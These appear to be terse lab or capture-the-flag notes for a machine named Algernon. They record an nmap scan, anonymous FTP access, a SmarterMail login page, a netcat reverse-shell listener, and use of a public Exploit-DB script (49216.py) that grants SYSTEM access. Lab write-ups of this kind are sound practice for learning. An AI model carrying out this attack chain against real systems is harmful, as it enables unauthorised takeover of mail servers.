# Algernon
# date 2-8-2023
# 192.168.191.65

# nmap
```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9998/tcp open  distinct32
```


# enum
```

└─$ ftp 192.168.191.65        
login anonymous
Port 80 redirects to the default IIS page.
Port 9998 directs us to the following login page for SmarterMail.
http://192.168.191.65:9998/interface/root
└─$ searchsploit SmarterMail               
```

# exploit
```

└─$ nc -lvnp 4444          

windows/remote/49216.py
modify exploit lhost host lport
└─$ python3 49216.py          
we got nt authority\system
 GG
```

